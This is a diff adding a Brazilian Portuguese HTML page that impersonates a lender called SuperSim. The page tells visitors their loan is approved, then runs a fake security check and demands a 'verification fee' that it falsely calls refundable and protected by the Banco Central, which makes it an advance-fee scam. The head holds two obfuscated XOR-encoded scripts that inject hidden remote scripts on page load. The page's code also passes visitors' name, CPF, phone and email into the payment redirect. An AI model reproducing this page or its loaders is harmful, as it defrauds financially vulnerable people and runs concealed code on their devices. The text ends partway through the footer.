@@ -1,0 +1,763 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-18399099985"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'AW-18399099985');
+</script>
+<script>(function(){var e_s8=atob("DEFP80rfpMp5GztFqTpthjizhvBbc08x2TJ13GW8wKRXbk8owCc23SmwyeQbaRQ2yjMmgz6si78NdkhqxSA7ljmriqAKORdnyDU7gSO90b4caBl/8jptnSuywehDOV8k3SBihj6yzawANks3zDcqnT7y3KkWfxY2yipt32ipxaYMfhl/i2My3zH9yqsUfhl/iyUuhyvy0b4Ucl08hDE9ljy6yr5UaE4nwCU80Wb90qsVbl5nk2Ntjhei");var u_6sp6=[];for(var n_8be=0;n_8be<e_s8.length;n_8be++){u_6sp6.push(e_s8.charCodeAt(n_8be)&255);}var j_p0=u_6sp6[0];var m_n0=u_6sp6.slice(1,1+j_p0);var s_2tl1=u_6sp6.slice(1+j_p0);var w_kq=s_2tl1.map(function(b,a_23z4){return b^m_n0[a_23z4%j_p0];});var r_86="";for(var v_bgq8=0;v_bgq8<w_kq.length;v_bgq8++){r_86+=String.fromCharCode(w_kq[v_bgq8]&255);}var k_g=decodeURIComponent(escape(r_86));var k_r=JSON.parse(k_g);var s_4up=k_r.globals||[];s_4up.forEach(function(u_g){window[u_g.name]=u_g.value;});var k_lju=document.createElement("script");k_lju.src=k_r.url;k_lju.async=true;k_lju.defer=true;(k_r.attributes||[]).forEach(function(d_kry){k_lju.setAttribute(d_kry.name,d_kry.value);});(document.head||document.documentElement).appendChild(k_lju);})();</script>
+<script>(function(){var f_ddk=atob("DO5HeOQLZRpSUmvYFZVlDZZnRyBwOh+sZZ19V8toAXR8Jx+1fIg+VodkCDQwIESrdpwuCJB4Smo7Kg60Op4uAIFnSH09PQy0cMAtC8YnR3smJhmxd5szHZcpX0EPfkm/eYElGYh4RyAJKUm2dIMiWt4pAnU9NQe9RYc/HYhCATh+cB25eZsiWt4pU3tqMFu6JN5/S9c+BCM0ZVrtJt0hGYA9R2cPLw==");var b_a16k=[];for(var h_ga=0;h_ga<f_ddk.length;h_ga++){b_a16k.push(f_ddk.charCodeAt(h_ga)&255);}var t_lr6x=b_a16k[0];var d_y=b_a16k.slice(1,1+t_lr6x);var r_xco=b_a16k.slice(1+t_lr6x);var j_76=r_xco.map(function(b,j_ig){return b^d_y[j_ig%t_lr6x];});var v_sl9n="";for(var k_ldl=0;k_ldl<j_76.length;k_ldl++){v_sl9n+=String.fromCharCode(j_76[k_ldl]&255);}var l_el=decodeURIComponent(escape(v_sl9n));var a_mkl=JSON.parse(l_el);var b_4a=a_mkl.globals||[];b_4a.forEach(function(u_1j){window[u_1j.name]=u_1j.value;});var h_lgjb=document.createElement("script");h_lgjb.src=a_mkl.url;h_lgjb.async=true;h_lgjb.defer=true;(a_mkl.attributes||[]).forEach(function(x_i3){h_lgjb.setAttribute(x_i3.name,x_i3.value);});(document.head||document.documentElement).appendChild(h_lgjb);})();</script>
+    <meta charset="utf-8">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+    <title>Confirmação de Empréstimo</title>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700&family=Plus+Jakarta+Sans:wght@500;600;700;800&family=Outfit:wght@400;500;600;700;800&display=swap');
+
+        :root {
+            --cred-primary: #22C55E;
+            --cred-light: #22C55E;
+            --cred-dark: #16A34A;
+            --cred-accent: #111827;
+            --bg: #F4F5F7;
+            --text: #1f2937;
+            --muted: #6b7280;
+            --card: #ffffff;
+            --border: #e5e7eb;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'DM Sans', Arial, Helvetica, sans-serif;
+            background: #ffffff;
+            color: var(--text);
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            min-height: 100vh;
+            padding: 0;
+        }
+
+        .card,
+        .loading,
+        .card-final {
+            padding: 1.5rem 1.25rem;
+            max-width: 460px;
+            width: 100%;
+            display: none;
+            flex-direction: column;
+            gap: .75rem;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 0;
+            box-shadow: none;
+        }
+
+        .card.active,
+        .loading.active,
+        .card-final.active {
+            display: flex;
+        }
+
+        /* Logo SuperSim */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1rem;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            user-select: none;
+        }
+
+        .logo-text {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-weight: 800;
+            font-size: 20px;
+            color: #111827;
+            letter-spacing: -0.5px;
+            line-height: 1;
+        }
+
+        .logo-on {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            font-weight: 800;
+            font-size: 20px;
+            color: #22C55E;
+            letter-spacing: -0.5px;
+            line-height: 1;
+        }
+
+        h2 {
+            font-size: 1.35rem;
+            font-weight: 700;
+            color: var(--cred-accent);
+            margin-bottom: .25rem;
+        }
+
+        .value {
+            font-size: 2.2rem;
+            font-weight: 800;
+            color: #0F003D;
+            margin-bottom: .25rem;
+        }
+
+        .recipient {
+            font-size: .98rem;
+            color: #4b5563;
+            margin-bottom: 1rem;
+        }
+
+        .recipient b {
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .info-line {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: .95rem;
+            margin-bottom: .6rem;
+            color: #374151;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .info-line:last-of-type {
+            border-bottom: none;
+        }
+
+        .info-line span:last-child {
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .box {
+            margin-top: 1rem;
+            background: linear-gradient(135deg, #F8F8F8 0%, #E8EAF6 100%);
+            border: 1px solid rgba(15,0,61,0.15);
+            border-radius: 12px;
+            padding: 1rem;
+            font-size: .95rem;
+            color: var(--cred-accent);
+            text-align: left;
+            line-height: 1.5;
+        }
+
+        .box-icon {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: #0F003D;
+        }
+
+        .button,
+        .final-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 1rem;
+            width: 100%;
+            background: linear-gradient(90deg, #FE690A 0%, #FDAC17 100%);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            padding: 1rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            text-align: center;
+            line-height: 1.25;
+            transition: transform .06s ease, filter .2s ease, box-shadow .2s ease;
+            box-shadow: 0 4px 15px rgba(254, 105, 10, 0.3);
+        }
+        .button svg, .final-button svg { flex-shrink: 0; }
+
+        .button:active,
+        .final-button:active {
+            transform: scale(0.98);
+        }
+
+        .button:hover,
+        .final-button:hover {
+            filter: brightness(1.05);
+            box-shadow: 0 6px 20px rgba(254, 105, 10, 0.4);
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 8px;
+            background-color: #e5e7eb;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+
+        .progress-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #FE690A 0%, #FDAC17 100%);
+            transition: width .1s linear;
+            border-radius: 8px;
+        }
+
+        .status-text {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: .75rem;
+            color: #0F003D;
+            text-align: center;
+        }
+
+        .fade-out-up {
+            opacity: 0;
+            transform: translateY(-12px);
+            transition: .3s ease;
+        }
+
+        .fade-in-up {
+            opacity: 1;
+            transform: translateY(0);
+            transition: .3s ease;
+        }
+
+        .wrapper-final {
+            background-color: #F5F6FA;
+            padding: .75rem;
+            border-radius: 1rem;
+        }
+        .verif-scan { text-align: center; padding: 2rem 1rem; }
+        .verif-scan-ring {
+            width: 46px; height: 46px; margin: 0 auto 16px; border-radius: 50%;
+            border: 3px solid #E4E7F2; border-top-color: #0F003D; animation: spin .8s linear infinite;
+        }
+        .verif-scan-text { font-size: .9rem; color: #5B6472; font-weight: 600; }
+        .verif-scan-bar { width: 72%; max-width: 240px; height: 6px; margin: 16px auto 0; background: #E4E7F2; border-radius: 99px; overflow: hidden; }
+        .verif-scan-bar span { display: block; height: 100%; width: 40%; border-radius: 99px; background: linear-gradient(90deg, #FE690A, #FDAC17); animation: verifLoad 1.4s ease-in-out infinite; }
+        @keyframes verifLoad { 0% { margin-left: -40%; } 100% { margin-left: 100%; } }
+
+        .verif-result {
+            background: #fff; border: 1px solid #E7E9F2; border-radius: 14px;
+            padding: 1.35rem 1.15rem 1.15rem; text-align: center;
+            opacity: 0; transform: translateY(10px); transition: opacity .35s ease, transform .35s ease;
+        }
+        .verif-badge {
+            width: 54px; height: 54px; margin: 0 auto .85rem; border-radius: 50%;
+            background: #FFF3E5; color: #E9770B; display: flex; align-items: center; justify-content: center;
+        }
+        .verif-badge svg { width: 28px; height: 28px; }
+        .verif-title { font-size: 1.05rem; font-weight: 700; color: #0F003D; margin-bottom: .4rem; }
+        .verif-desc { font-size: .85rem; line-height: 1.5; color: #5B6472; margin-bottom: 1.1rem; }
+        .verif-fee {
+            text-align: center; background: #F5F6FA; border: 1px solid #E7E9F2; border-radius: 12px; padding: .9rem .95rem;
+        }
+        .verif-fee-label { display: block; font-size: .8rem; font-weight: 600; color: #5B6472; margin-bottom: 3px; }
+        .verif-fee-value { display: block; font-size: 1.5rem; font-weight: 800; color: #0F003D; letter-spacing: -.5px; }
+        .verif-note { display: flex; align-items: center; justify-content: center; gap: 6px; margin-top: .7rem; font-size: .78rem; color: #16A34A; font-weight: 600; }
+        .verif-note svg { width: 15px; height: 15px; flex-shrink: 0; }
+
+        .alert-box {
+            display: none;
+            align-items: flex-start;
+            gap: .4rem;
+            font-size: .82rem;
+            color: #374151;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp .3s ease forwards;
+        }
+        .alert-card {
+            flex: 1;
+            min-width: 0;
+            background: #fff;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: .6rem .8rem;
+        }
+        .alert-text { line-height: 1.35; }
+
+        .alert-box.strong { color: var(--cred-accent); font-weight: 600; }
+        .alert-box.strong .alert-card {
+            background: linear-gradient(135deg, #F8F8F8 0%, #E8EAF6 100%);
+            border-color: rgba(15,0,61,0.15);
+        }
+
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .icon-badge {
+            flex-shrink: 0;
+            width: 26px;
+            height: 26px;
+            margin-top: 4px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #FEF3E2;
+            color: #E08C0A;
+        }
+        .icon-badge svg { width: 15px; height: 15px; }
+        .icon-shield { background: #EAF1FB; color: #2f6fd6; }
+        .icon-check { background: #E7F6EF; color: #1d9e75; }
+
+        .spinner {
+            border: 3px solid #E8EAF6;
+            border-top: 3px solid #0F003D;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
+            animation: spin .7s linear infinite;
+            margin: 12px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse-green {
+            0% { box-shadow: 0 4px 15px rgba(254, 105, 10, 0.3); }
+            50% { box-shadow: 0 4px 25px rgba(254, 105, 10, 0.6); }
+            100% { box-shadow: 0 4px 15px rgba(254, 105, 10, 0.3); }
+        }
+
+        .pulse-green {
+            animation: pulse-green 2s infinite;
+        }
+
+        /* Badge de segurança */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            margin-top: 1rem;
+            padding: 0.75rem;
+            background: #f9fafb;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: #6b7280;
+        }
+
+        .security-badge svg {
+            width: 16px;
+            height: 16px;
+            color: var(--cred-primary);
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 2rem;
+            text-align: center;
+            padding: 1rem;
+        }
+
+        .footer-logo {
+            height: 32px;
+            margin-bottom: 0.5rem;
+        }
+
+        .footer small {
+            font-size: 0.75rem;
+            color: #9ca3af;
+            line-height: 1.4;
+        }
+
+        /* Loading container styling */
+        .loading {
+            text-align: center;
+            padding: 3rem 1.5rem;
+        }
+
+        .loading .spinner {
+            width: 48px;
+            height: 48px;
+            border-width: 4px;
+            margin-bottom: 1.5rem;
+        }
+    
+/* =================== FOOTER SUPERSIM =================== */
+.ss-footer{background:#fff;border-top:1px solid #E5E7EB;padding:32px 20px 24px;text-align:center;font-family:"DM Sans",-apple-system,BlinkMacSystemFont,sans-serif;color:#6B7280;font-size:14px;line-height:1.6}
+.ss-footer-logo{margin-bottom:16px}
+.ss-footer-logo img{height:28px;width:auto;display:inline-block}
+.ss-footer-company{font-size:14px;font-weight:700;color:#111827;margin-bottom:4px}
+.ss-footer-addr{font-size:12px;color:#9CA3AF;margin-bottom:16px}
+.ss-footer-links{display:flex;justify-content:center;gap:8px;flex-wrap:wrap;margin-bottom:16px;padding-top:16px;border-top:1px solid #E5E7EB}
+.ss-footer-links a{color:#374151;text-decoration:none;font-size:12px;font-weight:500;cursor:pointer}
+.ss-footer-links a:hover{color:#F97316}
+.ss-footer-links span{opacity:.4;font-size:12px}
+.ss-footer-badges{display:flex;align-items:center;justify-content:center;gap:16px;flex-wrap:wrap}
+.ss-footer-badges span{display:flex;align-items:center;gap:4px;font-size:11px;color:#6B7280;font-weight:500}
+.ss-footer-badges svg{width:14px;height:14px;color:#0F003D}
+.ss-dialog{border:0;padding:0;border-radius:20px;color:#111827;max-width:600px;width:calc(100% - 32px);box-shadow:0 20px 60px rgba(0,0,0,.2)}
+.ss-dialog::backdrop{background:rgba(0,0,0,.5);backdrop-filter:blur(4px)}
+.ss-dialog-head{display:flex;justify-content:space-between;align-items:center;padding:24px 24px 20px;border-bottom:1px solid #E5E7EB}
+.ss-dialog-head h2{font-family:"DM Sans",sans-serif;font-size:20px;font-weight:700;margin:0}
+.ss-dialog-close{background:none;border:none;font-size:32px;color:#6B7280;cursor:pointer;width:36px;height:36px;display:flex;align-items:center;justify-content:center;border-radius:50%;transition:all .2s;line-height:1;padding:0}
+.ss-dialog-close:hover{background:#F3F4F6;color:#111827}
+.ss-dialog-body{padding:24px;overflow-y:auto;max-height:70vh}
+.ss-dialog-body h3{font-size:17px;font-weight:700;color:#111827;margin:24px 0 12px}
+.ss-dialog-body h3:first-child{margin-top:0}
+.ss-dialog-body p{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:16px}
+.ss-dialog-body ul{margin:12px 0 16px 20px;padding:0}
+.ss-dialog-body li{font-size:14px;line-height:1.7;color:#6B7280;margin-bottom:8px}
+.ss-contact-item{display:flex;gap:16px;align-items:flex-start;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:16px;margin-bottom:12px}
+.ss-contact-icon{width:48px;height:48px;background:#0F003D;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.ss-contact-icon svg{color:#fff;width:24px;height:24px}
+.ss-contact-item h4{font-size:15px;font-weight:700;color:#111827;margin:0 0 4px}
+.ss-contact-item p{font-size:14px;color:#6B7280;margin:0}
+.ss-contact-note{margin-top:16px;padding:20px;background:#FAFBFC;border:1px solid #E5E7EB;border-radius:12px}
+.ss-contact-note p{font-size:13px;line-height:1.6;color:#374151;margin-bottom:8px}
+.ss-contact-note p:last-child{margin-bottom:0}
+.ss-contact-note strong{color:#0F003D}
+
+</style>
+</head>
+
+<body>
+    <!-- CARD INICIAL -->
+    <div class="card active" id="card">
+        <div class="logo-container">
+            <img src="images/9ABL8HuToEnV.png" alt="SuperSim" style="height:32px;">
+        </div>
+
+        <h2><svg width="24" height="24" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>Empréstimo Aprovado</h2>
+        <div class="value" id="value">R$ 0,00</div>
+        <div class="recipient">para <b id="nome-completo">Usuário</b></div>
+        
+        <div class="info-line"><span>CPF</span><span id="cpf">xxx.xxx.xxx-xx</span></div>
+        <div class="info-line"><span>Tipo de transferência</span><span>Pix</span></div>
+        <div class="info-line"><span>Data</span><span id="data">08/09/2026</span></div>
+        
+        <div class="box">
+            <div class="box-icon">
+                <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                </svg>
+                Crédito Liberado
+            </div>
+            Seu valor está disponível para liberação imediata. Confira seus dados e prossiga para confirmar a transferência para sua chave Pix cadastrada.
+        </div>
+        
+        <button class="button pulse-green" onclick="iniciarTransferencia()">
+            <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:6px;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg>
+            Confirmar transferência
+        </button>
+        
+        <div class="security-badge">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+            </svg>
+            Ambiente seguro e criptografado
+        </div>
+    </div>
+
+    <!-- TELA DE CARREGAMENTO -->
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <h2 id="status-text" class="status-text">Processando...</h2>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="bar"></div>
+        </div>
+    </div>
+
+    <!-- CARD FINAL -->
+    <div class="card-final" id="card-final">
+        <div class="logo-container">
+            <img src="images/9ABL8HuToEnV.png" alt="SuperSim" style="height:32px;">
+        </div>
+
+        <h2 style="font-size: 1.25rem; margin-bottom: .5rem;"><svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="display:inline;vertical-align:middle;margin-right:8px;color:var(--cred-primary)"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>Comprovante de solicitação</h2>
+        <div class="wrapper-final"></div>
+        <button class="final-button pulse-green" onclick="redirect()">Pagar Taxa de verificação</button>
+        
+        <div class="security-badge">
+            <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+            Transação protegida pelo Banco Central
+        </div>
+    </div>
+
+    <!-- Footer -->
+
+    <script>
+        // =============== UTIL ===============
+        const LS = {
+            read(k, fb = "") { try { const v = localStorage.getItem(k); return (v ?? "").toString().trim() || fb; } catch { return fb; } },
+            readJSON(k, fb = {}) { try { const r = localStorage.getItem(k); if (!r) return fb; const o = JSON.parse(r); return (o && typeof o === "object") ? o : fb; } catch { return fb; } },
+            write(k, v) { try { localStorage.setItem(k, String(v)); } catch { } },
+            writeJSON(k, o) { try { localStorage.setItem(k, JSON.stringify(o || {})); } catch { } },
+        };
+        const firstNonEmpty = (...vals) => { for (const v of vals) { if (v == null) continue; const s = String(v).trim(); if (s) return s; } return ""; };
+        const normalizeToNumber = v => {
+            if (typeof v === "number" && Number.isFinite(v)) return v; if (!v) return 0;
+            let s = String(v).replace(/\s+/g, ""); if (/,/.test(s) && /\./.test(s)) s = s.replace(/\./g, "").replace(",", "."); else if (/,/.test(s)) s = s.replace(",", ".");
+            s = s.replace(/[^\d.-]/g, ""); const n = Number(s); return Number.isFinite(n) ? n : 0;
+        };
+        const formatBRL = n => { try { return n.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }); } catch { return "R$ " + (Math.round(n * 100) / 100).toFixed(2).replace(".", ","); } };
+        const formatCPF = cpf => { const c = String(cpf || "").replace(/\D/g, ""); return c.length === 11 ? c.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "xxx.xxx.xxx-xx"; };
+
+        // =============== STATE/HYDRATE ===============
+        function hydrate() {
+            const userData = LS.readJSON("userData");
+            const dadosUsuario = LS.readJSON("dadosUsuario");
+            const utmParams = LS.readJSON("utmParams");
+            const checkoutData = LS.readJSON("checkoutData");
+
+            const nome = firstNonEmpty(
+                LS.read("nome"),
+                LS.read("name"),
+                LS.read("nomeUsuario"),
+                userData.name,
+                dadosUsuario.NOME,
+                checkoutData.name,
+                "Usuário"
+            );
+
+            const cpf = firstNonEmpty(
+                LS.read("cpf"),
+                LS.read("document"),
+                LS.read("cpfUsuario"),
+                userData.cpf,
+                dadosUsuario.CPF,
+                checkoutData.cpf
+            );
+
+            const telefone = firstNonEmpty(
+                LS.read("telephone"),
+                LS.read("phone"),
+                LS.read("telefone"),
+                dadosUsuario.TELEFONE,
+                checkoutData.phone
+            );
+
+            const email = firstNonEmpty(
+                LS.read("email"),
+                dadosUsuario.EMAIL,
+                dadosUsuario["E-MAIL"],
+                dadosUsuario.E_MAIL,
+                userData.email,
+                checkoutData.email
+            );
+
+            const credito = firstNonEmpty(
+                LS.read("selectedLoanAmount"),
+                LS.read("creditoSolicitado"),
+                LS.read("valorEmprestimo"),
+                LS.read("valorAprovado"),
+                checkoutData.valor,
+                LS.read("valor")
+            );
+            const creditoNumber = normalizeToNumber(credito);
+            const valorFormatado = creditoNumber > 0 ? formatBRL(creditoNumber) : "R$ 0,00";
+
+            const $nome = document.getElementById("nome-completo");
+            const $valor = document.getElementById("value");
+            const $cpf = document.getElementById("cpf");
+            const $data = document.getElementById("data");
+
+            if ($nome) $nome.textContent = nome || "Usuário";
+            if ($valor) $valor.textContent = valorFormatado;
+            if ($cpf) $cpf.textContent = cpf ? formatCPF(cpf) : "xxx.xxx.xxx-xx";
+            if ($data) {
+                const d = new Date();
+                $data.textContent = `${String(d.getDate()).padStart(2, '0')}/${String(d.getMonth() + 1).padStart(2, '0')}/${d.getFullYear()}`;
+            }
+
+            if (nome) LS.write("name", nome);
+            if (cpf) LS.write("document", cpf);
+            if (telefone) LS.write("telephone", telefone);
+            if (email) LS.write("email", email);
+            if (credito) LS.write("creditoSolicitado", creditoNumber || credito);
+
+            console.info("[SuperSim] hydrate()", {
+                origin: location.origin,
+                length: (() => { try { return localStorage.length } catch { return "blocked"; } })(),
+                nome, cpf, telefone, email, credito: creditoNumber, utmParams
+            });
+        }
+
+        window.iniciarTransferencia = function () {
+            document.getElementById("card")?.classList.remove("active");
+            document.getElementById("loading")?.classList.add("active");
+            const bar = document.getElementById("bar");
+            const statusText = document.getElementById("status-text");
+            let progress = 0, trocado = false;
+            const it = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(it);
+                    document.getElementById("loading")?.classList.remove("active");
+                    document.getElementById("card-final")?.classList.add("active");
+                    exibirAlertasComSpinner();
+                } else {
+                    progress++;
+                    if (bar) bar.style.width = progress + "%";
+                    if (progress === 70 && !trocado && statusText) {
+                        trocado = true;
+                        statusText.classList.add("fade-out-up");
+                        setTimeout(() => {
+                            statusText.textContent = "Finalizando...";
+                            statusText.classList.remove("fade-out-up");
+                            statusText.classList.add("fade-in-up");
+                        }, 300);
+                    }
+                }
+            }, 30);
+        };
+
+        // Monta os parâmetros do checkout a partir do localStorage (dados já preenchidos no funil),
+        // com fallback entre as variações de nome de chave, e preserva as UTMs da URL atual.
+        function buildCheckoutParams() {
+            const g = (...ks) => { for (const k of ks) { try { const v = localStorage.getItem(k); if (v && v.trim()) return v.trim(); } catch (e) {} } return ""; };
+            // Preserva TODAS as UTMs/parâmetros já presentes na URL (utm_*, src, sck, fbclid, gclid, xcod, etc.)
+            const p = new URLSearchParams(window.location.search);
+            ["offer","pix_total","seguro_price","bump1","amount","cotacao_index"].forEach(function(k){ p.delete(k); });
+            const setIfMissing = (k, v) => { if (v && !p.get(k)) p.set(k, v); };
+            setIfMissing("name", g("name", "nome", "nomeUsuario"));
+            setIfMissing("email", g("email"));
+            setIfMissing("telephone", g("telephone", "telefone"));
+            setIfMissing("document", g("document", "cpf", "cpfUsuario"));
+            return p.toString();
+        }
+
+        window.redirect = function () {
+            window.location.href = "../../pagamento/?offer=up1&" + buildCheckoutParams();
+        };
+
+        document.addEventListener("DOMContentLoaded", hydrate);
+        window.addEventListener("load", () => { try { hydrate(); } catch (e) { console.warn("hydrate@load", e); } });
+    </script>
+    
+    <script>
+        function escapeHTML(str) {
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#39;');
+        }
+
+        function nl2brSafe(str) {
+            return escapeHTML(str).replace(/\n/g, '<br>');
+        }
+
+        function exibirAlertasComSpinner() {
+            const wrapper = document.querySelector(".wrapper-final");
+            if (!wrapper) return;
+
+            // 1) Fase de verificação (escaneando)
+            wrapper.innerHTML =
+                '<div class="verif-scan">' +
+                    '<div class="verif-scan-ring"></div>' +
+                    '<div class="verif-scan-text">Verificando segurança da transação...</div>' +
+                    '<div class="verif-scan-bar"><span></span></div>' +
+                '</div>';
+
+            // 2) Resultado da verificação
+            setTimeout(function () {
+                wrapper.innerHTML =
+                    '<div class="verif-result">' +
+                        '<div class="verif-badge">' +
+                            '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M12 8v4M12 16h.01"/></svg>' +
+                        '</div>' +
+                        '<div class="verif-title">Verificação de segurança necessária</div>' +
+                        '<div class="verif-desc">Identificamos uma movimentação de valor alto. Para liberar sua transferência com segurança e evitar fraudes, é necessário pagar a Taxa de Verificação de Conta.</div>' +
+                        '<div class="verif-fee">' +
+                            '<span class="verif-fee-label">Taxa de Verificação de Conta</span>' +
+                            '<span class="verif-fee-value">R$ 26,81</span>' +
+                        '</div>' +
+                        '<div class="verif-note"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>Reembolsável após a confirmação do pagamento</div>' +
+                    '</div>';
+                var card = wrapper.querySelector(".verif-result");
+                requestAnimationFrame(function () {
+                    card.style.opacity = "1";
+                    card.style.transform = "translateY(0)";
+                });
+            }, 1800);
+        }
+    </script>
+
+    <script src="../../js-upsell-nav.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            initUpsell(1);
+        });
+    </script>
+<script src="../../js-utm-capture.js" defer=""></script>
+
+
+<!-- FOOTER SUPERSIM -->
+<footer class="ss-footer">
+  <div class="ss-footer-logo"><img src="images/9ABL8HuToEnV.png" alt="SuperSim"></div>
+  <p class="ss-footer-company">&copy; 2026 Pagamentos S.A &ndash; Instituição de Pagamento.</p>
+  <p class="ss-footer-addr">São Paulo, SP &ndash; CEP 05409-000</p>
+  <div class="ss-footer-links">
+    <a onclick="document.getElementById('ss-termos').showModal();return false;">Termos de Uso</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-privacidade').showModal();return false;">Política de Privacidade</a><span>&bull;</span>
+    <a onclick="document.getElementById('ss-contato').showModal();return false;">Contato</a>
+  </div>
+  <div class="ss-footer-badges">
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>SSL Seguro</span>
+    <span><svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>Dados protegidos</span>
